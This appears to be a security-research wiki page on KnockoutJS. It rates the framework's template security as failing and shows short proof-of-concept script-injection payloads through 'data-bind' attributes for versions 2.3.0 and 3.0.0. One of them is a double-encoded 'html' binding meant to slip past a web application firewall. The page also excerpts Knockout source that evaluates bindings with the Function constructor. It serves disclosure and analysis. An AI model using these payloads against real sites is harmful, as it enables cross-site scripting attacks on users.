

# Introduction #

"Knockout is a standalone JavaScript implementation of the Model-View-ViewModel pattern with templates. The underlying principles are therefore:

  * a clear separation between domain data, view components and data to be displayed
  * the presence of a clearly defined layer of specialized code to manage the relationships between the view components

The latter leverages the native event management features of the Javascript language.

These features streamline and simplify the specification of complex relationships between view components, which in turn make the display more responsive and the user experience richer.

Knockout was developed and is maintained by Steve Sanderson, a Microsoft employee. The author stresses that this is a personal open-source project, and not a Microsoft product"

From http://en.wikipedia.org/wiki/KnockoutJS

# Quick Facts #

  * [KnockoutJS 3.0.0 (Uncompressed)](http://knockoutjs.com/downloads/knockout-3.0.0.debug.js)
  * Usage Stats http://trends.builtwith.com/javascript/KnockoutJS


  * **{}SEC-A** <font color='red'><b>FAIL</b></font> Template expressions are equivalent to `eval`
  * **{}SEC-B** <font color='red'><b>FAIL</b></font> No sandbox or isolated execution scope
  * **{}SEC-C** <font color='red'><b>FAIL</b></font> JavaScript code will be executed from within `data` attributes
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, no obvious way to outsource templates to static files
  * **{}SEC-E** <font color='red'><b>FAIL</b></font> No dedicated security response program, no security@knockoutjs.com address

# Injection Attacks #

## KnockoutJS 2.3.0 ##

KnockoutJS is attackers best friend since it allows to execute arbitrary JavaScript by injecting into HTML5 data attributes. Any labelled JavaScript code that is being found inside a `data-bind` attribute will be evaluated once the bindings are being applied by KnockoutJS.

The following "paste-and-go"-ready code example demonstrates that.

```
<script src="http://knockoutjs.com/downloads/knockout-2.3.0.js"></script>
<div data-bind="x:alert(1)" />
<script> 
	ko.applyBindings();
</script>
```

## KnockoutJS 3.0.0 ##

Not much has changed - only the example above doesn't work any more. Well, with some quick changes applied we can get our `alert` back and do the same as we did before. In essence, the label of our binding must match a binding provided by KnockoutJS - and there's quite a bunch of them.

```
<script src="http://knockoutjs.com/downloads/knockout-3.0.0.debug.js"></script>
<div data-bind="click: alert(1)"></div>
<div data-bind="value: alert(2)"></div>
<div data-bind="style: alert(3)"></div>
...
<select data-bind="options: alert(99)"></select>
<script> 
ko.applyBindings();
</script>
```

Fellow contributor [@jmaxxz](https://twitter.com/jmaxxz) pointed out the following: Even worse than the JavaScript execution via `data-bind` is the abuse HTML bindings to inject almost arbitrary content - with double-encoded payload. This is especially helpful if any form of WAF is in the way.

```
<script src="http://knockoutjs.com/downloads/knockout-3.0.0.debug.js"></script>
<div data-bind="html: '&#x5c;x3cimg&#x5c;x20src=x&#x5c;x20onerror=alert&#x5c;x281&#x5c;x29&#x5c;x3e'"></div>
<script> 
ko.applyBindings();
</script>
```

## Eval via Function ##

As can be seen, very much like CanJS, KnockoutJS uses a string containing a `with()` block to wrap the template data and then send it to the `Function` constructor for direct string-to-code.

```
parseBindingsString: function(b, c, d) {
    try {
        var f;
        if (!(f = this.Na[b])) {
            var g = this.Na, e, m = "with($context){with($data||{}){return{" + a.g.ea(b) + "}}}";
            e = new Function("$context", "$element", m);
            f = g[b] = e
        }
        return f(c, d)
    } catch (h) {
        throw h.message = "Unable to parse bindings.\nBindings value: " + b + "\nMessage: " + h.message, h;
    }
}
```

In KnockoutJS 3.0.0 - the example above shows code from 2.3.0 - things have changed a little bit. The way our code is being executed is still the same though: the value of `data-bind` is being parsed and parts of it are passed to the function constructor.

```
    function createBindingsStringEvaluator(bindingsString, options) {
        // Build the source for a function that evaluates "expression"
        // For each scope variable, add an extra level of "with" nesting
        // Example result: with(sc1) { with(sc0) { return (expression) } }
        var rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),
            functionBody = "with($context){with($data||{}){return{" + rewrittenBindings + "}}}";
        return new Function("$context", "$element", functionBody);
    }
```

## Binding via innerHTML ##

KnockoutJS uses `innerHTML` to add markup to the document - and does some magic when coming to elements that shouldn't stand for themselves such as table heads etc.:

```
    function simpleHtmlParse(html) {
        // Based on jQuery's "clean" function, but only accounting for table-related elements.
        // If you have referenced jQuery, this won't be used anyway - KO will use jQuery's "clean" function directly

        // Note that there's still an issue in IE < 9 whereby it will discard comment nodes that are the first child of
        // a descendant node. For example: "<div><!-- mycomment -->abc</div>" will get parsed as "<div>abc</div>"
        // This won't affect anyone who has referenced jQuery, and there's always the workaround of inserting a dummy node
        // (possibly a text node) in front of the comment. So, KO does not attempt to workaround this IE issue automatically at present.

        // Trim whitespace, otherwise indexOf won't work as expected
        var tags = ko.utils.stringTrim(html).toLowerCase(), div = document.createElement("div");

        // Finds the first match from the left column, and returns the corresponding "wrap" data from the right column
        var wrap = tags.match(/^<(thead|tbody|tfoot)/)              && [1, "<table>", "</table>"] ||
                   !tags.indexOf("<tr")                             && [2, "<table><tbody>", "</tbody></table>"] ||
                   (!tags.indexOf("<td") || !tags.indexOf("<th"))   && [3, "<table><tbody><tr>", "</tr></tbody></table>"] ||
                   /* anything else */                                 [0, "", ""];

        // Go to html and back, then peel off extra wrappers
        // Note that we always prefix with some dummy text, because otherwise, IE<9 will strip out leading comment nodes in descendants. Total madness.
        var markup = "ignored<div>" + wrap[1] + html + wrap[2] + "</div>";
        if (typeof window['innerShiv'] == "function") {
            div.appendChild(window['innerShiv'](markup));
        } else {
            div.innerHTML = markup;
        }

        // Move to the right depth
        while (wrap[0]--)
            div = div.lastChild;

        return ko.utils.makeArray(div.lastChild.childNodes);
    }
```